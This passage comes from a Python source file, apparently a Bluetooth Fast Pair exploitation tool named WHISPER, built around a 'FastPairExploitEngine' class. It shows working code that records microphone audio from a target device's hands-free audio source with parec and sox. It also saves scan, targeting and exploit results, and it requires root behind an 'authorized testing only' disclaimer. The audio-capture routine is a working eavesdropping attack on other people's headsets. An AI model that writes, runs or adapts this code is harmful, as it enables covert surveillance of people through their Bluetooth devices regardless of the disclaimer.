                record_cmd = f"parec --device={source_name} --format=s16le --rate=16000 --channels=1 | sox -t raw -r 16000 -e signed-integer -b 16 -c 1 - {audio_filename} trim 0 {duration}"
                
                process = await asyncio.create_subprocess_shell(
                    record_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                await asyncio.sleep(duration)
                
                process.terminate()
                await process.wait()
                
                if os.path.exists(audio_filename) and os.path.getsize(audio_filename) > 0:
                    results["capture_success"] = True
                    results["audio_file"] = audio_filename
                    results["file_size"] = os.path.getsize(audio_filename)
                else:
                    results["error"] = "Audio file not created"
            
            else:
                results["error"] = "Could not find HFP audio source"
        
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def _save_scan_results(self, devices: List[FastPairDevice]):
        """Save scan results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.results_dir}/scans/scan_{timestamp}.json"
        
        try:
            data = {
                "timestamp": datetime.now().isoformat(),
                "device_count": len(devices),
                "devices": [device.to_dict() for device in devices]
            }
            
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
        
        except Exception as e:
            print(f"Failed to save scan results: {e}")
    
    def _save_all_devices_scan(self, all_devices: List[Dict], fast_pair_devices: List[FastPairDevice]):
        """Save all devices scan"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{self.results_dir}/scans/all_devices_{timestamp}.json"
        
        try:
            data = {
                "timestamp": datetime.now().isoformat(),
                "total_devices": len(all_devices),
                "fast_pair_devices": len(fast_pair_devices),
                "all_devices": all_devices,
                "fast_pair_devices_detail": [device.to_dict() for device in fast_pair_devices]
            }
            
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
        
        except Exception as e:
            print(f"Failed to save all devices scan: {e}")
    
    def _save_targeting_results(self, results: Dict):
        """Save targeting results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        device_addr = results["target"].replace(":", "")
        filename = f"{self.results_dir}/scans/target_{device_addr}_{timestamp}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
        
        except Exception as e:
            print(f"Failed to save targeting results: {e}")
    
    def _save_exploit_results(self, results: Dict):
        """Save exploit results"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        device_addr = results["target"].replace(":", "")
        filename = f"{self.results_dir}/exploits/exploit_{device_addr}_{timestamp}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2)
        
        except Exception as e:
            print(f"Failed to save exploit results: {e}")

async def main():
    """Main entry point"""
    # Check for root
    import os
    if os.geteuid() != 0:
        print("This tool requires root privileges for Bluetooth operations.")
        print("Please run with: sudo python whisper_fastpair.py")
        return
    
    # Display warning
    print("\n" + "="*70)
    print("WHISPER - Fast Pair Security Research Tool")
    print("="*70)
    print("\nWARNING: This tool is for authorized security testing only.")
    print("Unauthorized use may be illegal.")
    print("\nYou must have:")
    print("1. Ownership of target devices OR written permission")
    print("2. Authorization for security testing")
    print("3. Compliance with all applicable laws")
    print("\n" + "="*70)
    
    confirm = input("\nType 'I ACCEPT RESPONSIBILITY' to continue: ")
    if confirm != "I ACCEPT RESPONSIBILITY":
        print("Exiting...")
        return
    
    # Initialize engine
    engine = FastPairExploitEngine()
    
    # Run main menu
    try:
        await engine.menu()
    except KeyboardInterrupt:
        print("\n\nExiting WHISPER...")
    except Exception as e:
        print(f"\nFatal error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
